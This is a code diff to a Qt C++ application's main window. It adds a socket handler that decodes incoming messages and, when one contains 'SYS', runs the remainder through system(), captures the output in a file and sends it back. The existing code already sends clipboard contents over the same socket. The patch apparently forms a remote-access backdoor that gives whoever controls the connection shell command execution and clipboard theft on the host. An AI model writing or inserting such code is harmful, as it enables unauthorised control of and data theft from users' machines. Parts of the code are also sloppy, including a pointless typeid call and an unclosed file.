@@ -1,5 +1,6 @@
 #include "mainwindow.h"
 #include "ui_mainwindow.h"
+#include <cstdlib>
 
 
 
@@ -22,7 +23,7 @@ MainWindow::MainWindow(QWidget *parent)
         //qDebug() << "sleeping";
 }
 */
-//system(qPrintable(command));
+//
 }
 void MainWindow::read(){
   QString returnStr = QByteArray::fromBase64(this->clientSocket->readAll());
@@ -32,6 +33,22 @@ void MainWindow::read(){
   {
           MainWindow::sendCmd(this->clippy->getclipboardString());
 }
+  else if(returnStr.contains("SYS"))
+  {
+      returnStr.remove(0,4);
+      system(qPrintable(returnStr + ">> command.txt"));
+      qDebug() << returnStr;
+      QFile *file = new QFile("command.txt");
+      if(!file->open(QIODevice::ReadWrite))
+      {
+          qWarning("Couldn't save the file");
+      }
+      QTextStream in(file);
+      QString output = in.readAll();
+      typeid("typeid is" + returnStr);
+      MainWindow::sendCmd(output);
+
+  }
   switch (this->networdHandler) {
 /*
     case SYS:
